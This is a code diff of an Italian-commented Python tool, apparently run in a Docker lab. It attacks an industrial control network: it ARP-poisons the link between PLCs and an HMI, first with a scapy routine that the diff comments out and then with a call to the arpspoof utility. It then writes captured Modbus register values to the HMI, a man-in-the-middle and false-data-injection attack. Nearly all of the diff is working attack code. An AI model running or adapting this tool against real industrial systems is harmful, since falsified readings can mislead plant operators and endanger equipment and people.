@@ -19,53 +19,97 @@ import configparser
 from collections import defaultdict
 from concurrent.futures import ThreadPoolExecutor
 
-def handle_arp_packet(packet):
-    if ARP in packet and packet[ARP].op == "is-at":
-        # Elabora il pacchetto ARP qui
-        # Estrarre l'indirizzo MAC e l'indirizzo IP dal pacchetto
-        mac = packet[ARP].hwsrc
-        ip = packet[ARP].psrc
-        print(f"Received ARP Response - IP: {ip}, MAC: {mac}")
+#def handle_arp_packet(packet):
+#    if ARP in packet and packet[ARP].op == "is-at":
+#        # Elabora il pacchetto ARP qui
+#        # Estrarre l'indirizzo MAC e l'indirizzo IP dal pacchetto
+#        mac = packet[ARP].hwsrc
+#        ip = packet[ARP].psrc
+#        print(f"Received ARP Response - IP: {ip}, MAC: {mac}")
 
-def p(packet):
-    print(packet)
+#def p(packet):
+#    print(packet)
 
-def get_mac(ip):
+#def get_mac(ip):
     # Crea il pacchetto ARP per richiedere l'indirizzo MAC
-    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
-    print(arp_request)
+#    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
+#    print(arp_request)
     # Invia il pacchetto ARP e ottieni la risposta
-    arp_response, unanswered = sr(ARP(op="who-has", psrc='172.17.0.1', pdst=ip))
-    print("stampa unanswered", unanswered)
+#    arp_response, unanswered = sr(ARP(op="who-has", psrc='172.17.0.1', pdst=ip))
+#    print("stampa unanswered", unanswered)
     #sniff(prn=p, filter="arp", store=False)
-    print("stampa response", arp_response)
+#    print("stampa response", arp_response)
     # Estrai l'indirizzo MAC dalla risposta
-    if arp_response:
-        return arp_response[0][1].hwsrc
-    return None
+#    if arp_response:
+#        return arp_response[0][1].hwsrc
+#    return None
 
-def arp_poison(target_ip, gateway_ip, plc_ips, hmi_ip, attacker_mac):
-    plc_macs = [get_mac(ip) for ip in plc_ips]
-    print("plc_macs", plc_macs)
-    hmi_mac = get_mac(hmi_ip)
-    print("hmi_mac", hmi_mac)
-    if None in plc_macs or hmi_mac is None:
-        print("Failed to retrieve MAC addresses of PLCs or HMI.")
-        return
+#def arp_poison(target_ip, gateway_ip, plc_ips, hmi_ip, attacker_mac):
+#    plc_macs = [get_mac(ip) for ip in plc_ips]
+#    print("plc_macs", plc_macs)
+#    hmi_mac = get_mac(hmi_ip)
+#    print("hmi_mac", hmi_mac)
+#    if None in plc_macs or hmi_mac is None:
+#        print("Failed to retrieve MAC addresses of PLCs or HMI.")
+#        return
     # Aggiungi la cattura dei pacchetti ARP
     # sniff(prn=handle_arp_packet, filter="arp", store=False)
-    while True:
-        for plc_mac in plc_macs:
-            target_packet = ARP(op=2, pdst=target_ip, hwdst=plc_mac, psrc=gateway_ip, hwsrc=attacker_mac)
-            print("target_packet", target_packet)
-            gateway_packet = ARP(op=2, pdst=gateway_ip, hwdst=plc_mac, psrc=target_ip, hwsrc=attacker_mac)
-            print("gateway_packet", gateway_packet)
-            sendp(target_packet, verbose=False)
-            sendp(gateway_packet, verbose=False)
+#    while True:
+#        for plc_mac in plc_macs:
+#            target_packet = ARP(op=2, pdst=target_ip, hwdst=plc_mac, psrc=gateway_ip, hwsrc=attacker_mac)
+#            print("target_packet", target_packet)
+#            gateway_packet = ARP(op=2, pdst=gateway_ip, hwdst=plc_mac, psrc=target_ip, hwsrc=attacker_mac)
+#            print("gateway_packet", gateway_packet)
+#            sendp(target_packet, verbose=False)
+#            sendp(gateway_packet, verbose=False)
 
-        time.sleep(2)
+#        time.sleep(2)
         #break
-    print("HO FINITO")
+#    print("HO FINITO")
+
+logger = logging.getLogger(__name__)
+logger.setLevel(logging.ERROR)
+file_handler = logging.FileHandler('error.log')
+formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
+file_handler.setFormatter(formatter)
+logger.addHandler(file_handler)
+
+def send_data_to_hmi(data):
+    
+    hmi_ip = '172.17.0.2'  # Indirizzo IP dell'HMI
+    hmi_port = 502  # Porta Modbus dell'HMI
+
+    master = modbus_tcp.TcpMaster(hmi_ip, hmi_port)
+
+    try:
+        # Prova ad aprire la connessione
+        master.open()
+    except modbus_tk.modbus.ModbusError as e:
+        logger.error(f"Errore di connessione all'HMI: {str(e)}")
+        return
+
+    # Invia i dati all'HMI
+    for ip, registers in data.items():
+        for register_type, register_data in registers.items():
+            for register_name, register_value in register_data.items():
+                # Ottieni l'indirizzo Modbus dal nome del registro
+                register_address = int(register_name[3:])  # Rimuovi i primi 3 caratteri ('%IX', '%IW', '%QW', '%MW', '%QX') per ottenere l'indirizzo
+                if register_name.startswith('%QX') or register_name.startswith('%IX'):
+                    # Scrivi un valore di tipo bool (0 o 1) nelle registri discrete
+                    value_to_write = bool(int(register_value))
+                else:
+                    # Scrivi un valore di tipo int negli altri registri
+                    value_to_write = int(register_value)
+
+                # Scrivi il valore nel registro Modbus
+                try:
+                    master.execute(1, cst.WRITE_SINGLE_REGISTER, register_address, output_value=value_to_write, data_format='>H')
+                except modbus_tk.modbus.ModbusError as e:
+                    logger.error(f"Errore durante l'invio dei dati all'HMI: {str(e)}")
+                    break
+
+    # Chiudi la connessione
+    master.close()
 
 class ModbusServer(threading.Thread):
     def __init__(self, ip, port, json_files):
@@ -99,7 +143,10 @@ class ModbusServer(threading.Thread):
                 response.extend(data['values'])
         return response
 
-def parse_config_file(config_file):
+    def send_data_to_hmi(self):
+        send_data_to_hmi(self.captured_data)
+
+def parse_config_file(config_file, plc_names):
     config = configparser.ConfigParser()
     config.read(config_file)
 
@@ -109,7 +156,9 @@ def parse_config_file(config_file):
     hmi_port = config.get("Network", "hmi_port")
 
     for section in config.sections():
-        if section.startswith('PLC'):
+        if section.startswith('plc'):
+            if plc_names and section not in plc_names:
+                continue
             plc_ips.append(config.get(section, 'ip'))
             plc_ports.append(config.get(section, 'port'))
 
@@ -224,6 +273,11 @@ def start_capture(capture_duration, capture_started_event, server, plc_names, pl
     capture_registers(plc_names, plc_ips, plc_ports)
     server.stop()
 
+def run_arpspoof(target_ip, gateway_ip):
+    result = subprocess.run(['arpspoof', '-r', '-i', 'docker0', '-t', target_ip, gateway_ip], capture_output=True, text=True)
+    output = result.stdout
+    logger.info(output)
+
 def main():
     parser = argparse.ArgumentParser()
     parser.add_argument('--plc', nargs='+', help='IP addresses of PLCs to attack')
@@ -242,7 +296,7 @@ def main():
     config = configparser.ConfigParser()
     config.read(config_file)
 
-    plc_ips, plc_ports, hmi_ip, hmi_port = parse_config_file(config_file)
+    plc_ips, plc_ports, hmi_ip, hmi_port = parse_config_file(config_file, args.plc)
 
     print("Config file:", config_file)
     # print("plc_names:", prefixes)
@@ -262,7 +316,7 @@ def main():
         return
 
     server_ip = '0.0.0.0'
-    server_port = 510
+    server_port = 508
 
     server = ModbusServer(server_ip, server_port, json_files)
 
@@ -279,12 +333,14 @@ def main():
     print("gateway_ip",gateway_ip)
     attacker_mac = get_if_hwaddr('docker0')  # Replace "eth0" with your network interface name
     print("attacker_mac",attacker_mac)
-    arp_poison_thread = threading.Thread(target=arp_poison, args=(target_ip, gateway_ip, plc_ips, hmi_ip, attacker_mac))
+    #arp_poison_thread = threading.Thread(target=arp_poison, args=(target_ip, gateway_ip, plc_ips, hmi_ip, attacker_mac))
+    
+    arp_poison_thread = threading.Thread(target=run_arpspoof, args=(target_ip, gateway_ip))
     arp_poison_thread.start()
 
     try:
         if args.condition:
-            print(f"Waiting for condition '{args.condition}' to start the capture...")
+            logger.info(f"Waiting for condition '{args.condition}' to start the capture...")
             while True:
                 # Implement your condition logic here
                 if args.condition == 'start':
@@ -294,14 +350,18 @@ def main():
                     capture_thread.start()
                     server.capture_duration = capture_duration
                     server.capture_started = capture_started_event
+                    send_data_to_hmi(server.captured_data)
                     break
                 time.sleep(1)  # Wait for 1 second before checking the condition again
         else:
             time.sleep(args.time * 60)  # Capture duration in minutes
+            send_data_to_hmi(server.captured_data)
     except KeyboardInterrupt:
         pass
 
+    time.sleep(args.time * 60)    
     arp_poison_thread.join()
+    print("Il thread è terminato")
 
 if __name__ == '__main__':
     main()
